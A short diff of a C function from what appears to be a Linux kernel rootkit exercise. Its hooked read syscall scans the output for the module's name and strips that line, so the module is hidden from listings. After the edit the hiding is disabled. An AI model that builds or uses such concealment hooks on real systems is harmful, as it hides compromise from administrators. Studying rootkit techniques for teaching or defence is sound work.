@@ -132,8 +132,18 @@ asmlinkage long sneaky_sys_read(struct pt_regs *regs)
 
   // 2. Search buffer for sneaky_mod info                                                                                                                                            
   start = strstr(buff, mod);
+  if (start != NULL) {
+    end = strchr(start, '\n');
+    if (end != NULL) {
+      end = end + 1;
+      size_t n = (buff + nbytes) - end;
+      /*memmove(start, end, n);                                                                                                                               
+      nbytes -= (end - start);                                                                                                                                
+      return nbytes;*/
+      }
+  }
 
-  if (start != NULL)
+  /*if (start != NULL)
   {
 
     for (end = start; end < (start + nbytes); end++)
@@ -143,12 +153,12 @@ asmlinkage long sneaky_sys_read(struct pt_regs *regs)
       {
         end = end + 1; // include the newline                                                                                                                                        
         size_t n_bytes = (buff + nbytes) - end;
-        /*memmove(start, end, n_bytes);                                                                                                                                              
+        memmove(start, end, n_bytes);                                                                                                                                              
         nbytes -= (end - start);                                                                                                                                                     
-        return nbytes*/;
+        return nbytes;
         }
     }
-  }
+  }*/
   return nbytes;
 }
 
